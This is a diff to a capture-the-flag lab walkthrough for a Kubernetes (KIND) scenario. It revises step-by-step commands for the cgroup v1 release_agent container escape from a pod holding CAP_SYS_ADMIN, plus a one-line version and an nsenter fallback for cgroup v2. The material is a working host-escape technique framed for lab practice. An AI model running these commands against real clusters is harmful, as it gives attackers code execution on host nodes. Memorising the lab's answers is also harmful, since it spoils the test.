@@ -24,7 +24,7 @@
 | Difficulty | L3 |
 | Type | k8s (KIND cluster) |
 | Cluster Name | cve-k8s-14-capsys |
-| Flag Location | `/host-flag/flag.txt` on KIND node, mounted into pod at `/host-flag` |
+| Flag Location | `/host-flag/flag.txt` on the KIND node (not mounted into the pod; host access required) |
 
 ## Attack Path Summary
 1. Pod `capsys-pod` runs with `CAP_SYS_ADMIN` capability
@@ -89,35 +89,28 @@ mkdir -p /sys/fs/cgroup/memory/exploit
 # Enable notify_on_release for this cgroup
 echo 1 > /sys/fs/cgroup/memory/exploit/notify_on_release
 
-# Write the release agent script to the host filesystem
-# We need to write to a location readable by the host
-# Use /host-flag (which is mounted from the host) or /sys (which is also host-mounted)
-
-# Write a script that reads the flag and makes it accessible
-cat > /tmp/release_script.sh << 'SCRIPT'
+# Write the release agent script INSIDE the cgroup directory.
+# The cgroup mount is a hostPath mount, so the host sees the same file
+# at /sys/fs/cgroup/memory/exploit/payload.sh
+cat > /sys/fs/cgroup/memory/exploit/payload.sh << 'SCRIPT'
 #!/bin/sh
 cat /host-flag/flag.txt > /tmp/flag_captured.txt
+cp /tmp/flag_captured.txt /sys/fs/cgroup/memory/exploit/flag_captured.txt 2>/dev/null
 chmod 644 /tmp/flag_captured.txt
 SCRIPT
-chmod +x /tmp/release_script.sh
-
-# Copy the script to the host-flag mount (accessible from host)
-# But we need the script to be on the HOST filesystem for release_agent to execute it
-# Since /host-flag is a hostPath mount, the host can see it
-cp /tmp/release_script.sh /host-flag/release_script.sh
-chmod +x /host-flag/release_script.sh
+chmod +x /sys/fs/cgroup/memory/exploit/payload.sh
 ```
 
 ### Step 5: Set release_agent
 ```bash
 # Set the release_agent to point to our script
 # The path must be from the host's perspective
-echo "/host-flag/release_script.sh" > /sys/fs/cgroup/memory/release_agent
+echo "/sys/fs/cgroup/memory/exploit/payload.sh" > /sys/fs/cgroup/memory/release_agent
 # Expected: no output (if successful)
 
 # Verify
 cat /sys/fs/cgroup/memory/release_agent
-# Expected: /host-flag/release_script.sh
+# Expected: /sys/fs/cgroup/memory/exploit/payload.sh
 ```
 
 ### Step 6: Trigger the Release
@@ -139,11 +132,11 @@ After exiting and re-entering the pod:
 # Re-exec into the pod
 kubectl exec -it capsys-pod -- sh
 
-# Check if the flag was captured
-cat /host-flag/flag_captured.txt 2>/dev/null || cat /tmp/flag_captured.txt 2>/dev/null
-
-# Or check on the KIND node directly
-docker exec cve-k8s-14-capsys-control-plane cat /tmp/flag_captured.txt 2>/dev/null
+# The release_agent script wrote the flag on the host.
+# With hostPID, read it through the host /proc view or the cgroup mount:
+cat /sys/fs/cgroup/memory/exploit/flag_captured.txt 2>/dev/null
+# OR
+cat /proc/1/root/tmp/flag_captured.txt 2>/dev/null
 # Expected: flag{k8s-14-*}
 ```
 
@@ -153,19 +146,24 @@ docker exec cve-k8s-14-capsys-control-plane cat /tmp/flag_captured.txt 2>/dev/nu
 kubectl exec capsys-pod -- sh -c '
 mkdir -p /sys/fs/cgroup/memory/exploit
 echo 1 > /sys/fs/cgroup/memory/exploit/notify_on_release
-echo "#!/bin/sh" > /host-flag/payload.sh
-echo "cat /host-flag/flag.txt > /tmp/flag_captured.txt" >> /host-flag/payload.sh
-chmod +x /host-flag/payload.sh
-echo "/host-flag/payload.sh" > /sys/fs/cgroup/memory/release_agent
+echo "#!/bin/sh" > /sys/fs/cgroup/memory/exploit/payload.sh
+echo "cat /host-flag/flag.txt > /sys/fs/cgroup/memory/exploit/flag_captured.txt" >> /sys/fs/cgroup/memory/exploit/payload.sh
+chmod +x /sys/fs/cgroup/memory/exploit/payload.sh
+echo "/sys/fs/cgroup/memory/exploit/payload.sh" > /sys/fs/cgroup/memory/release_agent
 echo $$ > /sys/fs/cgroup/memory/exploit/cgroup.procs
 '
 # Then exit the pod to trigger
+# Re-exec and read: cat /sys/fs/cgroup/memory/exploit/flag_captured.txt
 ```
 
 ### Step 9: Capture Flag
 - Flag format: `flag{k8s-14-*}`
-- Flag location: `/host-flag/flag.txt` on the KIND node
+- Flag location: `/host-flag/flag.txt` on the KIND node (host access required; not mounted into the pod)
 - Expected output: `flag{k8s-14-default}` (or custom value from `CVE_FLAG`)
+
+> 注：release_agent 逃逸依赖 cgroup v1。若节点为 cgroup v2，可改用
+> `nsenter --target 1 --mount -- cat /host-flag/flag.txt`（本场景 pod 已启用
+> hostPID + CAP_SYS_ADMIN）。
 
 ## Verification Commands
 ```bash
